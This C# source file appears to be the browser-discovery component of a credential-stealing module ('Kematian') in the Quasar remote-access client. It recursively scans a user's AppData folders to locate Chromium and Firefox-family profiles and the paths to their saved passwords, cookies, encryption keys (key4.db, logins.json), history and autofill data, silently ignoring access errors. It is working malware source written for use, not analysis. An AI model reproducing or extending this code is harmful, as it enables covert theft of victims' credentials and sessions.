﻿using Quasar.Client.Kematian.Browsers.Helpers.Structs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace Quasar.Client.Kematian.Browsers.Helpers
{
    public class Crawler
    {
        public List<ChromiumBrowserPath> GetChromiumBrowsers()
        {
            var browsers = new ConcurrentBag<ChromiumBrowserPath>();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] rootDirs = { localAppData, appData };
            string[] profileNames = { "Default", "Profile" };

            Parallel.ForEach(rootDirs, rootDir =>
            {
                if (!Directory.Exists(rootDir)) return;

                Parallel.ForEach(SafeEnumerateDirectories(rootDir), dir =>
                {
                    string userDataPath = Path.Combine(dir, "User Data");
                    if (Directory.Exists(userDataPath))
                    {
                        string localStatePath = Path.Combine(userDataPath, "Local State");
                        if (File.Exists(localStatePath))
                        {
                            var profiles = FindChromiumProfiles(userDataPath, profileNames);
                            if (profiles.Length > 0)
                            {
                                var browser = new ChromiumBrowserPath
                                {
                                    LocalStatePath = localStatePath,
                                    ProfilePath = userDataPath,
                                    Profiles = profiles
                                };

                                browsers.Add(browser);
                            }
                        }
                    }
                });
            });

            return browsers.ToList();
        }

        private ChromiumProfile[] FindChromiumProfiles(string basePath, string[] profileNames)
        {
            var profiles = new List<ChromiumProfile>();
            if (!Directory.Exists(basePath)) return profiles.ToArray();

            foreach (var dir in SafeEnumerateDirectories(basePath))
            {
                if (profileNames.Any(name => Path.GetFileName(dir).StartsWith(name, StringComparison.OrdinalIgnoreCase)))
                {
                    var profile = new ChromiumProfile
                    {
                        Name = Path.GetFileName(dir),
                        WebData = Path.Combine(dir, "Web Data"),
                        Cookies = Path.Combine(dir, "Network", "Cookies"),
                        History = Path.Combine(dir, "History"),
                        LoginData = Path.Combine(dir, "Login Data"),
                        Bookmarks = Path.Combine(dir, "Bookmarks")
                    };

                    // Validate the profile by checking if at least one of the essential files exists
                    if (File.Exists(profile.WebData) || File.Exists(profile.Cookies) || File.Exists(profile.History) || File.Exists(profile.LoginData) || File.Exists(profile.Bookmarks))
                    {
                        if (basePath.Contains("Application Data"))
                        {
                            continue;
                        }
                        profiles.Add(profile);
                    }
                }
            }

            return profiles.ToArray();
        }

        public List<GeckoBrowserPath> GetGeckoBrowsers()
        {
            var browsers = new ConcurrentBag<GeckoBrowserPath>();
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            Parallel.ForEach(SafeEnumerateDirectories(appData), dir =>
            {
                String path_end = dir.Split('\\').Last();
                if (path_end.Contains(".default-"))
                {
                    var profiles = FindGeckoProfiles(dir);
                    if (profiles.Length > 0)
                    {
                        var browser = new GeckoBrowserPath
                        {
                            ProfilesPath = dir,
                            Profiles = profiles
                        };

                        browsers.Add(browser);
                    }
                }
            });

            return browsers.ToList();
        }

        private GeckoProfile[] FindGeckoProfiles(string basePath)
        {
            var profiles = new List<GeckoProfile>();

            var profile = new GeckoProfile
            {
                Name = basePath.Split('\\').Last(),
                Path = basePath,
                Key4DB = Path.Combine(basePath, "key4.db"),
                LoginsJson = Path.Combine(basePath, "logins.json"),
                Cookies = Path.Combine(basePath, "cookies.sqlite"),
                History = Path.Combine(basePath, "places.sqlite")
            };

            if (File.Exists(profile.Key4DB) || File.Exists(profile.LoginsJson) || File.Exists(profile.Cookies) || File.Exists(profile.History))
            {
                profiles.Add(profile);
            }

            return profiles.ToArray();
        }

        private IEnumerable<string> SafeEnumerateDirectories(string path)
        {
            var directories = new List<string>();
            try
            {
                foreach (var dir in Directory.EnumerateDirectories(path))
                {
                    directories.Add(dir);

                    // Recursively enumerate subdirectories
                    try
                    {
                        directories.AddRange(SafeEnumerateDirectories(dir));
                    }
                    catch (UnauthorizedAccessException)
                    {
                        //Debug.WriteLine("Unauthorized access to directory: " + dir);
                    }
                    catch (PathTooLongException)
                    {
                        // Skip directories with paths that are too long
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                //Debug.WriteLine(path);
            }
            catch (PathTooLongException)
            {
                // Skip root-level directories with paths that are too long
            }
            return directories;
        }
    }
}
